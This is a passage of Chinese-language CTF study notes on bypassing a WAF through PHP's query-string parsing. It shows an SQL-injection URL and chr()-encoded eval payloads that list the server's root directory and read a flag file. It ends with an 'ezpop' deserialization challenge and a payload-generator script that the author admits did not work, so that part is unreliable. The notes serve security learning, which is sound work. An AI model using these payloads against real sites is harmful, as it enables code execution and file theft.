PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。

HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

1.删除空白符

2.将某些字符转换为下划线（包括空格）

![](1663836929761-0854ce4c-eea6-4f66-b348-0f70f165ecab.png)

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

可以发现过滤了很多东西。

但是直接往num参数里传不行，如果在之前的计算那个网页尝试过几次，你会知道那个计算的东西是不允许传入字符的。因此我们可以利用字符串解析的特性，不传入num，而是传入 num(num前面有一个空格)：

为什么要在num前加一个空格？

答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。

? num=var_dump(scandir(chr(47)))

? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

![](1663837532434-936822f7-e765-4179-a84a-8c4cf044ba68.png)

[  
](https://blog.csdn.net/rfrder/article/details/109172067)

试试访问calc.php

尝试给num传参：发现只能传数字 而不能传字母。而我们要读取的可能就是flag这个文件

那我们可以利用PHP的字符串解析特性来绕过WAF，在num前面加上空格

绕过num传参后，我们要读取他根目录下的文件。

也就是

calc.php? num=print_r(scandir('/'));

那就用chr()绕过，chr(47)就是斜杠/ ： ? num=print_r(scandir(chr(47)));

输入后 可以浏览根目录下的文件，而其中的falgg就是我们要读取的文件

```html
? num=print_r(file_get_contents('/flagg'));

其中/flagg 用chr进行绕过

? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); 

```

var_dump()用来打印

scandir（）用来获取目录文件
chr（47）是/的ASCII编码，因为/被过滤了，用这个什么都不显示。

搞不懂它为什么会被过滤，被什么过滤。

再就是num前有个空格，用来绕过waf（web防火墙）（为什么是waf？）。

这是php的机制，在传进php代码的url时，一些字符会被忽略或变成_。

因为php一般是这样\$_GET['num']获取url传进来的参数,当有一些奇怪的字符和参数写在一些时，如%[num%id,它会变成$_GET['num_id']。所以在num前加个空格可以绕过waf并且php会把它当成正常的num使用，此时并不是’ num’而是‘num’。

```chr(47)——/  
chr(102)——f  
chr(49)——1  
chr(97)——a  
chr(103)——g  
它们之间用.连接，因为是php。  
我试过用base64.decode('Lw==')代替chr（47）但：`ecode('Lw==')代替chr（47）
```

# 例题  ezpop  UUCTF(公共赛道)

```php
 <?php
//flag in flag.php
error_reporting(0);
class UUCTF{
    public $name,$key,$basedata,$ob;
    function __construct($str){
        $this->name=$str;
    }
    function __wakeup(){
    if($this->key==="UUCTF"){
            $this->ob=unserialize(base64_decode($this->basedata));
        }
        else{
            die("oh!you should learn PHP unserialize String escape!");
        }
    }
}
class output{
    public $a;
    function __toString(){
        $this->a->rce();
    }
}
class nothing{
    public $a;
    public $b;
    public $t;
    function __wakeup(){
        $this->a="";
    }
    function __destruct(){
        $this->b=$this->t;
        die($this->a);
    }
}
class youwant{
    public $cmd;
    function rce(){
        eval($this->cmd);
    }
}
$pdata=$_POST["data"];
if(isset($pdata))
{
    $data=serialize(new UUCTF($pdata));
    $data_replace=str_replace("hacker","loveuu!",$data);
    unserialize($data_replace);
}else{
    highlight_file(__FILE__);
}
?>

```

以上题目未解出，无法触发 toString，无法绕过wakeup？？？？，下面这个也没做出来！！

```php
<?php 

$ml = "phpinfo();";
$ml_l = strlen($ml);

$pay1 = 'O:7:"nothing":3:{s:1:"a";O:6:"output":1:{s:1:"a";O:7:"youwant":1:{s:3:"cmd";s:'.$ml_l.':"'.$ml.'";}}s:1:"b";s:1:"b";s:1:"t";s:1:"t";}';
//$pay1 = 'O:6:"output":1:{s:1:"a";O:7:"youwant":1:{s:3:"cmd";s:'.$ml_l.':"'.$ml.'";}}';
//echo $pay1;echo "\n";echo "\n";
$pay1_base64 = base64_encode($pay1);
//echo $pay1_base64;

$len = strlen($pay1_base64);
//echo $len;

$ha = "hacker";

$le = '";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:'.$len.':"'.$pay1_base64.'";s:2:"ob";N;}';
$pay3 = '";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:'.$len.':"'.$pay1.'";s:2:"ob";N;}';
$len3 = strlen($pay1);
//echo $le;
$len1 = strlen($le);
//echo str_repeat($ha,$len3).$pay3;
echo "\n";echo "\n";
echo str_repeat($ha,$len1).$le;
echo "\n";echo "\n";
echo urlencode(str_repeat($ha,$len1).$le);
echo "\n";echo "\n";
$pay2 = '";s:3:"key";s:5:"UUCTF";s:8:"basedata";N;s:2:"ob";N;}';
$len2 = strlen($pay2);
echo str_repeat($ha,$len2).$pay2;
```


